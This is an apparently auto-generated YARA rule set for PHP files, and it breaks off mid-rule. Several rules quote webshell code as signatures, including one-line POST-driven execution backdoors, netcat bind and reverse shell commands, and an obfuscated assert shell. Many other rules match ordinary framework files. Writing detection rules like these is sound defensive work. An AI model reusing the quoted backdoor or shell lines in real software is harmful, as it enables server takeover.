/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-02-23
   Identifier: php22
*/

/* Rule Set ----------------------------------------------------------------- */

rule ProjectProviderFile
{
   meta:
      description = "php22 - file ProjectProviderFile.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b7c2b7c76769a4c0abaf1f2b76633862d0449e05ca54cfe651b3520c5dd96d7d"
   strings:
      $s1 = "* getContents()" fullword ascii
      $s2 = "* @version    $Id: ProjectProviderFile.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s3 = "* @see Zend_Tool_Project_Context_Filesystem_File" fullword ascii
      $s4 = "* getPersistentAttributes()" fullword ascii
      $s5 = "* getProjectProviderName()" fullword ascii
      $s6 = "$this->_filesystemName = ucfirst($this->_projectProviderName) . 'Provider.php';" fullword ascii
      $s7 = "$this->_projectProviderName = $this->_resource->getAttribute('projectProviderName');" fullword ascii
      $s8 = "* @return Zend_Tool_Project_Context_Zf_ProjectProviderFile" fullword ascii
      $s9 = "// require_once 'Zend/Tool/Project/Context/Filesystem/File.php';" fullword ascii
      $s10 = "* getName()" fullword ascii
      $s11 = "$this->_actionNames = $this->_resource->getAttribute('actionNames');" fullword ascii
      $s12 = "'projectProviderName' => $this->getProjectProviderName()," fullword ascii
      $s13 = "* @see Zend_CodeGenerator_Php_File" fullword ascii
      $s14 = "* items within a specific project." fullword ascii
      $s15 = "class Zend_Tool_Project_Context_Zf_ProjectProviderFile extends Zend_Tool_Project_Context_Filesystem_File" fullword ascii
      $s16 = "* This class is the front most class for utilizing Zend_Tool_Project" fullword ascii
      $s17 = "* A profile is a hierarchical set of resources that keep track of" fullword ascii
      $s18 = "public function getProjectProviderName()" fullword ascii
      $s19 = "public function getPersistentAttributes()" fullword ascii
      $s20 = "$this->_actionNames = ($this->_actionNames) ? array($this->_actionNames) : array();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule phpjackal_2
{
   meta:
      description = "php22 - file phpjackal_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f2b8d0d0eb8717ee5c4e0daf1bd09bf6b4e2e1cc02c49ed223688d1a369f1236"
   strings:
      $x1 = "if(!$bd)echo $error;else shelL(\"$name -L -p $port -e cmd.exe\");" fullword ascii
      $x2 = "if(!$bd)echo $error;else shelL(\"$name $ip $port -e cmd.exe\");" fullword ascii
      $x3 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x4 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x5 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x6 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x7 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x8 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x9 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x10 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x11 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x12 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x13 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x14 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x15 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x16 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x17 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x18 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x19 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x20 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule php22_qiang12
{
   meta:
      description = "php22 - file qiang12.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bdc2489ef416d2a6de96197066ae30fc73e92a022481dde04b74d7e3d25e1652"
   strings:
      $s1 = "<?php $_POST['sa']($_POST['sb']);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule r57_1php
{
   meta:
      description = "php22 - file r57_1php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $x3 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s4 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s5 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s6 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s7 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s8 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s10 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s11 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s12 = "$db = @ocilogon($_POST['mysql_l'], $_POST['mysql_p'], $_POST['mysql_db']);" fullword ascii
      $s13 = "'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd'," fullword ascii
      $s14 = "'eng_text101'=>'Use reverse (user -> resu) login for password'," fullword ascii
      $s15 = "$sql2 .= \"INSERT INTO \".$_POST['mysql_tbl'].\" (\".$keys.\") VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s16 = "$sql2 .= \"INSERT INTO `\".$_POST['mysql_tbl'].\"` (`\".$keys.\"`) VALUES ('\".htmlspecialchars($values).\"');\\r\\n\";" fullword ascii
      $s17 = "asename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s18 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s19 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii
      $s20 = "$b = \"q1w2e3r4\"; //need hits \"shell created by evilc0ders\"" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule PostgresGrammar
{
   meta:
      description = "php22 - file PostgresGrammar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9377e2382f0ab0b50a7b57563798df86104e39aaf24d28773b2875889922eadf"
   strings:
      $x1 = "* The commands to be executed outside of create or alter command." fullword ascii
      $s2 = "* Compile the command to disable foreign key constraints." fullword ascii
      $s3 = "* Compile the command to enable foreign key constraints." fullword ascii
      $s4 = "* Compile a drop foreign key command." fullword ascii
      $s5 = "* Compile a drop unique key command." fullword ascii
      $s6 = "* Compile a drop primary key command." fullword ascii
      $s7 = "* @param  \\Illuminate\\Support\\Fluent  $command" fullword ascii
      $s8 = "* Compile a plain index key command." fullword ascii
      $s9 = "* Compile a spatial index key command." fullword ascii
      $s10 = "* Compile a foreign key command." fullword ascii
      $s11 = "* Compile a drop table (if exists) command." fullword ascii
      $s12 = "* Compile a primary key command." fullword ascii
      $s13 = "* Compile a drop spatial index command." fullword ascii
      $s14 = "* Compile a drop column command." fullword ascii
      $s15 = "* Compile a unique key command." fullword ascii
      $s16 = "* Compile a drop index command." fullword ascii
      $s17 = "* Compile a drop table command." fullword ascii
      $s18 = "* Compile a column addition command." fullword ascii
      $s19 = "* Compile a rename table command." fullword ascii
      $s20 = "* Compile a create table command." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}


rule php_shell_assert_remix3
{
   meta:
      description = "php22 - file php-shell-assert-remix3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d0d2915044379bfe8161dd80cade5bb1831b736a1db4318d2c4656f7501fad06"
   strings:
      $s1 = "$result .= chr(ord($string[$index]) - 3);" fullword ascii
      $s2 = "$result .= chr(ord($string[$index]) + 3);" fullword ascii
      $s3 = "call_user_func(decode('dvvhuw'),'$code=function() { '.$b['code'].'}');" fullword ascii
      $s4 = "for ($index = 0;$index < strlen($string);$index += 1)" fullword ascii
      $s5 = "$a = '_GET';" fullword ascii
      $s6 = "function decode($string) {" fullword ascii
      $s7 = "$a = decode('dvvhuw');" fullword ascii
   condition:
      uint16(0) == 0x3c0a and filesize < 1KB and
      all of them
}

rule php22_qiang1
{
   meta:
      description = "php22 - file qiang1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9fc885924d03d7a70fc3bb8b843f1f2f347f60fcb747b618919718d69500444d"
   strings:
      $s1 = "<?php ($_=@$_GET[2]).@$_($_POST[1])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Persister
{
   meta:
      description = "php22 - file Persister.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19699d7f8bba9c0b51f2818578a5ba77d88a00203c9fb3109d232ce2aab8f5cc"
   strings:
      $s1 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s2 = "$stmt->execute([$key, $value]);" fullword ascii
      $s3 = "private function insertUpdate(Connection $conn, $tableName, array $data, $identifier = null)" fullword ascii
      $s4 = "$stmt->execute([$subjectId, $groupName]);" fullword ascii
      $s5 = "private function getOrCreateParameter(Connection $conn, $key, $value)" fullword ascii
      $s6 = "$stmt->execute($values);" fullword ascii
      $s7 = "$stmt->execute([$benchmarkClass, $subjectName]);" fullword ascii
      $s8 = "$parameterId = $this->getOrCreateParameter($conn, $key, $value);" fullword ascii
      $s9 = "private function getSubjectId(Connection $conn, $benchmarkClass, $subjectName)" fullword ascii
      $s10 = "foreach ($variant->getParameterSet() as $key => $value) {" fullword ascii
      $s11 = "private function associateGroup(Connection $conn, $subjectId, $groupName)" fullword ascii
      $s12 = "private function insertMultiple(Connection $conn, $tableName, array $datas)" fullword ascii
      $s13 = "$subjectId = $this->getSubjectId($conn, $data['benchmark'], $data['name']);" fullword ascii
      $s14 = "$placeholders = sprintf('(%s)', implode(', ', array_fill(0, count($columnNames), '?')));" fullword ascii
      $s15 = "'memory' => $iteration->getMetricOrDefault(MemoryResult::class, 'peak', -1)," fullword ascii
      $s16 = "$conn = $this->manager->getConnection();" fullword ascii
      $s17 = "* This file is part of the PHPBench package" fullword ascii
      $s18 = "$stmt = $conn->prepare('SELECT id FROM parameter WHERE pkey = ? AND value = ?');" fullword ascii
      $s19 = "foreach ($suite->getEnvInformations() as $information) {" fullword ascii
      $s20 = "$stmt = $conn->prepare('INSERT INTO parameter (pkey, value) VALUES (?, ?)');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule Recorder
{
   meta:
      description = "php22 - file Recorder.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "915ee05851d1e4dc9d43836c894c17110f1e68b9e29eb3cfe48f1fcd007f630b"
   strings:
      $s1 = "* Copyright (c) 2010-2012, Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s2 = "* @author Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s3 = "* @copyright  2010 Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s4 = "* @author     Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s5 = "* @link       http://www.digitalsandwich.com/" fullword ascii
      $s6 = "*  *  Redistributions in binary form must reproduce the above copyright" fullword ascii
      $s7 = "* Phake - Mocking Framework" fullword ascii
      $s8 = "*  *  Redistributions of source code must retain the above copyright" fullword ascii
      $s9 = "*  *  Neither the name of Mike Lively nor the names of his" fullword ascii
      $s10 = "* It is assumed that calls will be recorded in the order that they are made." fullword ascii
      $s11 = "$this->positions[spl_object_hash($call)] = new Phake_CallRecorder_Position(self::$lastPosition++);" fullword ascii
      $s12 = "* Also removes all positions" fullword ascii
      $s13 = "* Returns all calls recorded in the order they were recorded." fullword ascii
      $s14 = "return new Phake_CallRecorder_CallInfo($call, $this->positions[spl_object_hash($call)]);" fullword ascii
      $s15 = "* Provides methods to playback calls again in order." fullword ascii
      $s16 = "* Records that a given" fullword ascii
      $s17 = "* Returns all unverified calls from the recorder" fullword ascii
      $s18 = "* Records calls made to particular objects." fullword ascii
      $s19 = "* Marks an individual call as being verified" fullword ascii
      $s20 = "* Removes all calls from the call recorder." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule portraitable
{
   meta:
      description = "php22 - file portraitable.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d9d71ac0c5be0ed274090f5181cba74707ac134326adc8f4f12e96866c4cc792"
   strings:
      $x1 = "* @link       http://www.GetAnahita.com" fullword ascii
      $s2 = "* @copyright  2008 - 2010 rmdStudio Inc./Peerglobe Technology Inc" fullword ascii
      $s3 = "* Return the portrait file for a size. Override the Portriable behavior due" fullword ascii
      $s4 = "* @param KCommandContext $context Context parameter" fullword ascii
      $s5 = "* @param  KCommandContext $context Context parameter" fullword ascii
      $s6 = "* @author     Rastin Mehr <rastin@anahitapolis.com>" fullword ascii
      $s7 = "* @author     Arash Sanieyan <ash@anahitapolis.com>" fullword ascii
      $s8 = "* @param array $config The portrait options [data,orientation,mimetype]" fullword ascii
      $s9 = "* @param KConfig $config An optional KConfig object with configuration options." fullword ascii
      $s10 = "* @param KCommandContext $context" fullword ascii
      $s11 = "'data' => file_get_contents($config->url)," fullword ascii
      $s12 = "* A boolearn flag to whether to keep the orignal file or not. By default set to true." fullword ascii
      $s13 = "* @license    GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s14 = "* Initializes the default configuration for the object." fullword ascii
      $s15 = "protected function _afterEntityInstantiate(KCommandContext $context)" fullword ascii
      $s16 = "protected function _beforeEntityDelete(KCommandContext $context)" fullword ascii
      $s17 = "$this->_pending_files = $this->getService('anahita:object.array');" fullword ascii
      $s18 = "* An arary of sizes to resize a portrait to." fullword ascii
      $s19 = "* Obtain the list of available sizes and dimensions for this photo." fullword ascii
      $s20 = "* @see LibBaseDomainBehaviorPortraitable" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule ProductAttributeApiTest
{
   meta:
      description = "php22 - file ProductAttributeApiTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4486fe4a9b86e495350e85c6e2fc400a3afc34b2d3eaee3af80658a9fc1e8282"
   strings:
      $s1 = "$this->client->request('POST', '/api/v1/product-attributes/text', [], [], static::$authorizedHeaderWithContentType, $dat" fullword ascii
      $s2 = "$this->client->request('POST', '/api/v1/product-attributes/select', [], [], static::$authorizedHeaderWithContentType, $d" fullword ascii
      $s3 = "$this->client->request('POST', '/api/v1/product-attributes/text', [], [], static::$authorizedHeaderWithContentType, []);" fullword ascii
      $s4 = "$this->client->request('POST', '/api/v1/product-attributes/select', [], [], static::$authorizedHeaderWithContentType, $data);" fullword ascii
      $s5 = "$this->client->request('POST', '/api/v1/product-attributes/text', [], [], static::$authorizedHeaderWithContentType, $data);" fullword ascii
      $s6 = "$this->client->request('POST', '/api/v1/product-attributes', [], [], static::$authorizedHeaderWithContentType, []);" fullword ascii
      $s7 = "$this->client->request('DELETE', '/api/v1/product-attributes/-1', [], [], static::$authorizedHeaderWithContentType);" fullword ascii
      $s8 = "$this->client->request('PUT', $this->getProductAttributeUrl($productAttribute), [], [], static::$authorizedHeaderWithCon" fullword ascii
      $s9 = "$this->client->request('GET', $this->getProductAttributeUrl($productAttribute), [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s10 = "$this->client->request('GET', $this->getProductAttributeUrl($productAttribute), [], [], static::$authorizedHeaderWithAcc" fullword ascii
      $s11 = "$this->client->request('PATCH', $this->getProductAttributeUrl($productAttribute), [], [], static::$authorizedHeaderWithC" fullword ascii
      $s12 = "$this->client->request('DELETE', $this->getProductAttributeUrl($productAttribute), [], [], static::$authorizedHeaderWith" fullword ascii
      $s13 = "private static $authorizedHeaderWithContentType = [" fullword ascii
      $s14 = "$this->client->request('GET', '/api/v1/product-attributes/', [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s15 = "$this->client->request('GET', '/api/v1/product-attributes/-1', [], [], static::$authorizedHeaderWithAccept);" fullword ascii
      $s16 = "'HTTP_Authorization' => 'Bearer SampleTokenNjZkNjY2MDEwMTAzMDkxMGE0OTlhYzU3NzYyMTE0ZGQ3ODcyMDAwM2EwMDZjNDI5NDlhMDdlMQ'," fullword ascii
      $s17 = "$responseContent = json_decode($response->getContent(), true);" fullword ascii
      $s18 = "Assert::assertArrayHasKey('configuration', $responseContent);" fullword ascii
      $s19 = "private function getProductAttributeUrl(ProductAttributeInterface $productAttribute)" fullword ascii
      $s20 = "$this->assertResponse($response, 'product_attribute/create_validation_fail_response', Response::HTTP_BAD_REQUEST);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule ObjectSelectFactory
{
   meta:
      description = "php22 - file ObjectSelectFactory.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c6bfb7f352899e0a78c6ccf0c7aff4752ddf19aff9ad4d65e33f9e425af5c29a"
   strings:
      $s1 = "* @author  Daniel Gimenes <daniel@danielgimenes.com.br>" fullword ascii
      $s2 = "$element->getProxy()->setObjectManager($entityManager);" fullword ascii
      $s3 = "* @link    http://www.doctrine-project.org/" fullword ascii
      $s4 = "return $this($container->getServiceLocator(), ObjectSelect::class);" fullword ascii
      $s5 = "* Factory for {@see ObjectSelect}" fullword ascii
      $s6 = "public function __invoke(ContainerInterface $container, $requestedName, array $options = null)" fullword ascii
      $s7 = "* @return ObjectSelect" fullword ascii
      $s8 = "* {@inheritDoc}" fullword ascii
      $s9 = "* @license MIT" fullword ascii
      $s10 = "use Zend\\ServiceManager\\FactoryInterface;" fullword ascii
      $s11 = "namespace DoctrineORMModule\\Service;" fullword ascii
      $s12 = "$entityManager = $container->get(EntityManager::class);" fullword ascii
      $s13 = "public function createService(ServiceLocatorInterface $container)" fullword ascii
      $s14 = "use DoctrineModule\\Form\\Element\\ObjectSelect;" fullword ascii
      $s15 = "use Zend\\ServiceManager\\ServiceLocatorInterface;" fullword ascii
      $s16 = "use Interop\\Container\\ContainerInterface;" fullword ascii
      $s17 = "use Doctrine\\ORM\\EntityManager;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}


rule reset_blade
{
   meta:
      description = "php22 - file reset.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6a1340ec822ed882f1d46330c687f3dcfea612cdcc29067252b7b6340f979bdc"
   strings:
      $s1 = "<strong>{{ trans('auth.login.alert.whoops') }}</strong> {{ trans('auth.login.alert.message') }}<br><" fullword ascii
      $s2 = "<strong>{{ trans('auth.login.alert.whoops') }}</strong> {{ trans('auth.login.alert.message') }}<br><br>" fullword ascii
      $s3 = "<form class=\"form-horizontal\" role=\"form\" method=\"POST\" action=\"{{ url('/password/reset') }}\">" fullword ascii
      $s4 = "<label class=\"col-md-4 control-label\">{{ trans('auth.login.password') }}</label>" fullword ascii
      $s5 = "<label class=\"col-md-4 control-label\">{{ trans('auth.login.email') }}</label>" fullword ascii
      $s6 = "<div class=\"form-group{{ $errors->has('password_confirmation') ? ' has-error' : '' }}\">" fullword ascii
      $s7 = "<strong>{{ $errors->first('password_confirmation') }}</strong>" fullword ascii
      $s8 = "<strong>{{ $errors->first('password') }}</strong>" fullword ascii
      $s9 = "@if ($errors->has('password_confirmation'))" fullword ascii
      $s10 = "<div class=\"form-group{{ $errors->has('password') ? ' has-error' : '' }}\">" fullword ascii
      $s11 = "<label class=\"col-md-4 control-label\">{{ trans('auth.register.password_confirmation') }}</label>" fullword ascii
      $s12 = "@if ($errors->has('password'))" fullword ascii
      $s13 = "<input type=\"password\" class=\"form-control\" name=\"password_confirmation\">" fullword ascii
      $s14 = "<div class=\"panel-heading\">{{ trans('auth.reset.title') }}</div>" fullword ascii
      $s15 = "<input type=\"password\" class=\"form-control\" name=\"password\">" fullword ascii
      $s16 = "<i class=\"fa fa-btn fa-refresh\"></i>{{ trans('auth.reset.btn.reset') }}" fullword ascii
      $s17 = "<input type=\"hidden\" name=\"token\" value=\"{{ $token }}\">" fullword ascii
      $s18 = "<input type=\"email\" class=\"form-control\" name=\"email\" value=\"{{ $email or old('email') }}\">" fullword ascii
      $s19 = "<strong>{{ $errors->first('email') }}</strong>" fullword ascii
      $s20 = "<div class=\"form-group{{ $errors->has('email') ? ' has-error' : '' }}\">" fullword ascii
   condition:
      uint16(0) == 0x6540 and filesize < 10KB and
      8 of them
}

rule ReportPendingItemSpec
{
   meta:
      description = "php22 - file ReportPendingItemSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0b5d10c589bad0dc56f93304688afb7281fb1ca12c5065686ee3f015f29c03c5"
   strings:
      $s1 = "function it_writes_a_pass_message_for_a_passing_example(Template $template, ExampleEvent $event)" fullword ascii
      $s2 = "$template->render(HtmlTemplate::DIR.'/Template/ReportPending.html', array(" fullword ascii
      $s3 = "function let(Template $template, ExampleEvent $event)" fullword ascii
      $s4 = "use PhpSpec\\Formatter\\Html\\Template as HtmlTemplate;" fullword ascii
      $s5 = "$this->beConstructedWith($template, $event);" fullword ascii
      $s6 = "$event->getTitle()->willReturn(self::EVENT_TITLE);" fullword ascii
      $s7 = "use PhpSpec\\Formatter\\Template;" fullword ascii
      $s8 = "namespace spec\\PhpSpec\\Formatter\\Html;" fullword ascii
      $s9 = "class ReportPendingItemSpec extends ObjectBehavior" fullword ascii
      $s10 = "use PhpSpec\\Event\\ExampleEvent;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule RequestEventInterface
{
   meta:
      description = "php22 - file RequestEventInterface.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8a097017ba8d7c4c0952a349fd1d26de642702fc11b28293b2e2098405a05085"
   strings:
      $s1 = "/** @return \\Symfony\\Component\\HttpFoundation\\Request */" fullword ascii
      $s2 = "use Symfony\\Component\\HttpFoundation\\Request as SymfonyRequest;" fullword ascii
      $s3 = "* @param Request $request" fullword ascii
      $s4 = "namespace Concrete\\Core\\Http;" fullword ascii
      $s5 = "public function getRequest();" fullword ascii
      $s6 = "public function setRequest(SymfonyRequest $request);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule php22_PageKey
{
   meta:
      description = "php22 - file PageKey.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6853fd9bf67c53804499db2cbb37cfb3dc6cc7cec2107f7a124a16b63e232f7d"
   strings:
      $s1 = "protected $multiplePageArray; // bulk operations" fullword ascii
      $s2 = "namespace Concrete\\Core\\Permission\\Key;" fullword ascii
      $s3 = "public function getMultiplePageArray()" fullword ascii
      $s4 = "public function setMultiplePageArray($pages)" fullword ascii
      $s5 = "return $this->multiplePageArray;" fullword ascii
      $s6 = "$this->multiplePageArray = $pages;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule Psr4CaseMismatch
{
   meta:
      description = "php22 - file Psr4CaseMismatch.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bcef3f208afa2d830f310b952f4ae2744846580052b39cd63a133c09fbd98559"
   strings:
      $s1 = "namespace Symfony\\Component\\Debug\\Tests\\Fixtures;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PostList
{
   meta:
      description = "php22 - file PostList.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fae79e16e18cc70456ea2eee573fdfcbc0c530c6bedb1fbc08434d0ca3cb1276"
   strings:
      $x1 = "* @param  Zend_Service_Delicious $service Service that has downloaded the post" fullword ascii
      $x2 = "* @var Zend_Service_Delicious Service that has downloaded the post list" fullword ascii
      $s3 = "* List of posts retrived from the del.icio.us web service" fullword ascii
      $s4 = "* @param  Zend_Service_Delicious_SimplePost $post" fullword ascii
      $s5 = "* @version    $Id: PostList.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s6 = "* @var array Array of Zend_Service_Delicious_Post" fullword ascii
      $s7 = "* @return  Zend_Service_Delicious_SimplePost" fullword ascii
      $s8 = "* @return Zend_Service_Delicious_SimplePost" fullword ascii
      $s9 = "* @return Zend_Service_Delicious_PostList" fullword ascii
      $s10 = "* Transforms DOMNodeList to array of posts" fullword ascii
      $s11 = "* Transforms the Array to array of posts" fullword ascii
      $s12 = "public function __construct(Zend_Service_Delicious $service, $posts = null)" fullword ascii
      $s13 = "$this->_addPost(new Zend_Service_Delicious_Post($this->_service, $curentNode));" fullword ascii
      $s14 = "* Implement ArrayAccess::offsetGet()" fullword ascii
      $s15 = "throw new Zend_Service_Delicious_Exception('You are trying to unset read-only property');" fullword ascii
      $s16 = "* @throws  Zend_Service_Delicious_Exception" fullword ascii
      $s17 = "* @param  array $postList" fullword ascii
      $s18 = "protected function _addPost(Zend_Service_Delicious_SimplePost $post)" fullword ascii
      $s19 = "class Zend_Service_Delicious_PostList implements Countable, Iterator, ArrayAccess" fullword ascii
      $s20 = "$this->_addPost(new Zend_Service_Delicious_SimplePost($f_post));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule RedirectResponseTest
{
   meta:
      description = "php22 - file RedirectResponseTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "94355c14f82c9fed3c4e975823c95bc800d81b916b8ddb75ece37297301bbd9b"
   strings:
      $x1 = "$this->request = new MockIncomingRequest($this->config, new URI('http://example.com'), null, new UserAgent());" fullword ascii
      $s2 = "$this->assertEquals('http://example.com/foo', $response->getHeaderLine('Location'));" fullword ascii
      $s3 = "Services::injectMock('validation', $validation);" fullword ascii
      $s4 = "Services::injectMock('request', $this->request);" fullword ascii
      $s5 = "$response = $response->to('http://example.com/foo');" fullword ascii
      $s6 = "Services::injectMock('routes', $this->routes);" fullword ascii
      $s7 = "$this->config->baseURL = 'http://example.com';" fullword ascii
      $s8 = "$this->assertEquals('baz', $_SESSION['_ci_old_input']['post']['bar']);" fullword ascii
      $s9 = "$this->assertArrayHasKey('_ci_validation_errors', $_SESSION);" fullword ascii
      $s10 = "$this->assertEquals('bar', $_SESSION['_ci_old_input']['get']['foo']);" fullword ascii
      $s11 = "$validation->method('getErrors')" fullword ascii
      $s12 = "use CodeIgniter\\Config\\Services;" fullword ascii
      $s13 = "use CodeIgniter\\Autoloader\\MockFileLocator;" fullword ascii
      $s14 = "$this->assertArrayHasKey('_ci_old_input', $_SESSION);" fullword ascii
      $s15 = "$this->assertArrayHasKey('foo', $_SESSION);" fullword ascii
      $s16 = "$this->assertTrue($response->hasHeader('Location'));" fullword ascii
      $s17 = "<?php namespace CodeIgniter\\HTTP;" fullword ascii
      $s18 = "$response = new RedirectResponse($this->config);" fullword ascii
      $s19 = "public function testWithValidationErrors()" fullword ascii
      $s20 = "$_POST = ['bar' => 'baz'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule php22_other
{
   meta:
      description = "php22 - file other.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b652d1e52c4c87ee572965f216a0d8aae448755042a95d3c5ba68970d4de48e2"
   strings:
